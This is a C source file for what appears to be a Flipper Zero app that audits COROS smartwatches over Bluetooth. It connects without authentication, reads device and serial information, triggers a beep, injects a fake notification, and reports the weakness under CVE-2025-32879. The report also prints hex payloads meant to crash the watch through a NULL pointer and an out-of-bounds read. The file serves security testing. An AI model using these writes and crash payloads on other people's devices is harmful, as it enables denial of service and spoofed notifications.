#include "../coros_auditor_app_i.h"

static void log_append(CorosAuditorApp* app, const char* text) {
    furi_string_cat_str(app->audit_log, text);
    text_box_set_text(app->text_box, furi_string_get_cstr(app->audit_log));
}

static void read_next_info(CorosAuditorApp* app);

static void handle_read(CorosAuditorApp* app) {
    furi_mutex_acquire(app->mutex, FuriWaitForever);
    uint8_t buf[256];
    uint16_t len = app->read_len;
    memcpy(buf, app->read_buf, len);
    app->has_read = false;
    furi_mutex_release(app->mutex);

    switch(app->read_step) {
    case 0: // Battery
        if(len >= 1) {
            furi_string_cat_printf(app->audit_log, "  Battery: %d%%\n", buf[0]);
        } else {
            log_append(app, "  Battery: (error)\n");
        }
        break;
    case 1: // Model
        if(len > 0) {
            buf[len < 255 ? len : 255] = '\0';
            furi_string_cat_printf(app->audit_log, "  Model: %s\n", (char*)buf);
        } else {
            log_append(app, "  Model: (error)\n");
        }
        break;
    case 2: // Serial
        if(len > 0) {
            buf[len < 255 ? len : 255] = '\0';
            furi_string_cat_printf(app->audit_log, "  Serial: %s\n", (char*)buf);
        } else {
            log_append(app, "  Serial: (error)\n");
        }
        break;
    case 3: // SW Version
        if(len > 0) {
            buf[len < 255 ? len : 255] = '\0';
            furi_string_cat_printf(app->audit_log, "  SW: %s\n", (char*)buf);
        } else {
            log_append(app, "  SW: (error)\n");
        }
        break;
    }
    text_box_set_text(app->text_box, furi_string_get_cstr(app->audit_log));

    app->read_step++;
    read_next_info(app);
}

static void read_next_info(CorosAuditorApp* app) {
    // Read standard GATT info step by step
    uint16_t handles[] = {app->battery_handle, app->model_handle, app->serial_handle, app->sw_rev_handle};
    const char* names[] = {"Battery", "Model", "Serial", "SW Version"};

    while(app->read_step < 4) {
        if(handles[app->read_step] != 0) {
            furi_string_cat_printf(app->audit_log, "  Reading %s...\n", names[app->read_step]);
            text_box_set_text(app->text_box, furi_string_get_cstr(app->audit_log));
            ble_gatt_client_read(app->connection_handle, handles[app->read_step]);
            return;
        }
        furi_string_cat_printf(app->audit_log, "  %s: (not found)\n", names[app->read_step]);
        text_box_set_text(app->text_box, furi_string_get_cstr(app->audit_log));
        app->read_step++;
    }

    // All reads done, move to next phase
    app->audit_phase = CorosAuditFindDevice;
    furi_timer_start(app->timer, 200);
}

static void advance_phase(CorosAuditorApp* app) {
    switch(app->audit_phase) {
    case CorosAuditFindDevice:
        if(app->cmd_write_handle) {
            log_append(app, "\n[*] Find Device (beep)...\n");
            ble_gatt_client_write(app->connection_handle, app->cmd_write_handle,
                COROS_CMD_BEEP, sizeof(COROS_CMD_BEEP));
        } else {
            log_append(app, "\n[!] No cmd channel found\n");
            app->audit_phase = CorosAuditFakeNotif;
            furi_timer_start(app->timer, 200);
        }
        break;

    case CorosAuditFakeNotif:
        if(app->notif_write_handle) {
            log_append(app, "\n[*] Fake notification...\n");
            // Benign fake notification: "Security" / "Audit Test"
            const uint8_t fake_notif[] = {
                0x79, 0x00, 0xFF,                           // header
                0x00, 0x08, 'S','e','c','u','r','i','t','y', // L0: "Security"
                0x10, 0x05, 'A','u','d','i','t',             // L1: "Audit"
                0x20, 0x04, 'T','e','s','t',                  // L2: "Test"
                0x00,                                         // terminator
            };
            ble_gatt_client_write(app->connection_handle, app->notif_write_handle,
                fake_notif, sizeof(fake_notif));
        } else {
            log_append(app, "\n[!] No notif channel\n");
            app->audit_phase = CorosAuditDone;
            furi_timer_start(app->timer, 200);
        }
        break;

    case CorosAuditDone: {
        log_append(app, "\n--- Audit Complete ---\n\n");
        log_append(app, "VULNERABLE:\n");
        log_append(app, "  No BLE authentication\n  (CVE-2025-32879)\n");
        if(app->battery_handle || app->serial_handle)
            log_append(app, "  Device info exposed\n");
        if(app->has_cmd_svc)
            log_append(app, "  Command channel open\n  (weloop service)\n");
        if(app->has_notif_svc)
            log_append(app, "  Notification inject\n  possible\n");
        log_append(app, "\nCrash tests (manual):\n");
        log_append(app, "  NULL ptr: 7900FF00002E\n  on notif channel\n");
        log_append(app, "  OOB: B900 then 0000\n  on cmd channel\n");
        notification_message(app->notifications, &sequence_success);
        break;
    }

    default:
        break;
    }
}

void coros_scene_audit_on_enter(void* context) {
    CorosAuditorApp* app = context;
    furi_string_reset(app->audit_log);
    app->audit_phase = CorosAuditReadInfo;
    app->read_step = 0;
    app->has_read = false;

    furi_string_cat_printf(app->audit_log,
        "=== COROS Audit ===\nDevice: %s\nServices: %d\n",
        app->current_device.has_name ? app->current_device.name : "Unknown",
        app->service_count);

    furi_string_cat_printf(app->audit_log, "CMD svc: %s  NOTIF: %s\n\n",
        app->has_cmd_svc ? "YES" : "no",
        app->has_notif_svc ? "YES" : "no");

    log_append(app, "[*] Reading device info...\n");

    text_box_reset(app->text_box);
    text_box_set_text(app->text_box, furi_string_get_cstr(app->audit_log));
    text_box_set_font(app->text_box, TextBoxFontText);
    view_dispatcher_switch_to_view(app->view_dispatcher, CorosViewTextBox);

    // Start reading device info
    read_next_info(app);
}

bool coros_scene_audit_on_event(void* context, SceneManagerEvent event) {
    CorosAuditorApp* app = context;
    if(event.type != SceneManagerEventTypeCustom) return false;

    if(event.event == CorosCustomEventTick) {
        furi_timer_stop(app->timer);
        advance_phase(app);
        return true;
    }

    if(event.event == CorosCustomEventReadComplete) {
        if(app->audit_phase == CorosAuditReadInfo) {
            handle_read(app);
        }
        return true;
    }

    if(event.event == CorosCustomEventWriteComplete) {
        if(app->audit_phase == CorosAuditFindDevice) {
            log_append(app, "  Beep sent OK!\n");
            app->audit_phase = CorosAuditFakeNotif;
            furi_timer_start(app->timer, 500);
        } else if(app->audit_phase == CorosAuditFakeNotif) {
            log_append(app, "  Notification sent OK!\n");
            app->audit_phase = CorosAuditDone;
            furi_timer_start(app->timer, 200);
        }
        return true;
    }

    if(event.event == CorosCustomEventGattError) {
        log_append(app, "  [!] GATT error\n");
        if(app->audit_phase == CorosAuditReadInfo) {
            app->read_step++;
            read_next_info(app);
        } else {
            app->audit_phase++;
            furi_timer_start(app->timer, 200);
        }
        return true;
    }

    return false;
}

void coros_scene_audit_on_exit(void* context) {
    CorosAuditorApp* app = context;
    furi_timer_stop(app->timer);
    if(app->connected) { gap_disconnect(app->connection_handle); app->connected = false; }
    text_box_reset(app->text_box);
}
